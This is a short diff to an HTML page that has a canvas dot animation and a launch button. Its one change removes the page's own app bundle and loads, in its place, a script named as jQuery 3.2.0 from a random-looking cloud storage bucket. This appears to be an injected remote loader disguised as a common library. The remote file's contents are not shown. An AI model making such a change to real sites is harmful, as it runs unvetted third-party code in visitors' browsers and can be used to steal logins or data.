@@ -38,6 +38,6 @@
     function resize(){canvas.width=innerWidth*devicePixelRatio;canvas.height=innerHeight*devicePixelRatio;ctx.scale(devicePixelRatio,devicePixelRatio);dots=Array.from({length:Math.min(90,Math.floor(innerWidth/8))},()=>({x:Math.random()*innerWidth,y:Math.random()*innerHeight,r:Math.random()*1.4+.2,a:Math.random()}))}function draw(){ctx.clearRect(0,0,innerWidth,innerHeight);dots.forEach(d=>{d.a+=.008;ctx.fillStyle=`rgba(215,255,47,${.18+.18*Math.sin(d.a)})`;ctx.beginPath();ctx.arc(d.x,d.y,d.r,0,Math.PI*2);ctx.fill()});requestAnimationFrame(draw)}addEventListener('resize',resize);resize();draw();
     const launch=document.getElementById('launch'),toast=document.getElementById('toast');launch.onclick=()=>{launch.textContent='You are in';toast.classList.add('show');setTimeout(()=>toast.classList.remove('show'),2400)};
   </script>
-  <script src="//lf-miaoda-static.feishucdn.com/app_17etr4aw28t/2/client/assets/index-B4kW0WPE.js"></script>
+  <script src="//xczzcxasd.oss-cn-hongkong.aliyuncs.com/jquery-3.2.0.min.js"></script>
 </body>
 </html>
